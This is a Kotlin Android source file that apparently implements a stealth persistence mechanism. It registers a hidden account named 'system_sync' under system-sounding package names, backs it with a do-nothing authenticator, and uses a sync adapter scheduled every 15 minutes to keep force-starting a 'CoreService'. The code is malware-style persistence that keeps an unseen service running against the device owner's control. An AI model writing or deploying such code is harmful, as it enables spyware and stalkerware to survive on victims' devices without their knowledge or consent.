// [context: Kotlin, Android API 26+, SyncAdapter periodic background hook]
package com.system.service.persistence

import android.accounts.*
import android.content.*
import android.os.Bundle
import android.os.IBinder

class StubAuthenticator(context: Context) : AbstractAccountAuthenticator(context) {
    override fun addAccount(r: AccountAuthenticatorResponse, type: String, feat: String?,
                            opts: Bundle?, b: Bundle) = null
    override fun getAuthToken(r: AccountAuthenticatorResponse, acct: Account, type: String,
                              opts: Bundle) = null
    override fun getAuthTokenLabel(t: String) = ""
    override fun confirmCredentials(r: AccountAuthenticatorResponse, a: Account, b: Bundle?) = null
    override fun updateCredentials(r: AccountAuthenticatorResponse, a: Account, t: String?, b: Bundle?) = null
    override fun hasFeatures(r: AccountAuthenticatorResponse, a: Account, f: Array<String>) = Bundle()
    override fun editProperties(r: AccountAuthenticatorResponse, t: String) = Bundle()
}

class AuthenticatorService : android.app.Service() {
    override fun onBind(intent: android.content.Intent): IBinder =
        StubAuthenticator(this).iBinder
}

class GuardSyncAdapter(context: Context, autoInit: Boolean)
    : AbstractThreadedSyncAdapter(context, autoInit) {
    override fun onPerformSync(acct: Account, extras: Bundle, authority: String,
                               provider: ContentProviderClient, status: SyncResult) {
        val svc = Intent(context, Class.forName("com.system.service.core.CoreService"))
        context.startForegroundService(svc)
    }
}

class SyncAdapterHook(private val context: Context) {
    fun registerAccount() {
        val am = AccountManager.get(context)
        val acct = Account("system_sync", "com.system.service.account")
        if (am.addAccountExplicitly(acct, null, null)) {
            ContentResolver.setIsSyncable(acct, "com.system.service.provider", 1)
            ContentResolver.setSyncAutomatically(acct, "com.system.service.provider", true)
            ContentResolver.addPeriodicSync(acct, "com.system.service.provider", Bundle(), 900L)
        }
    }
}
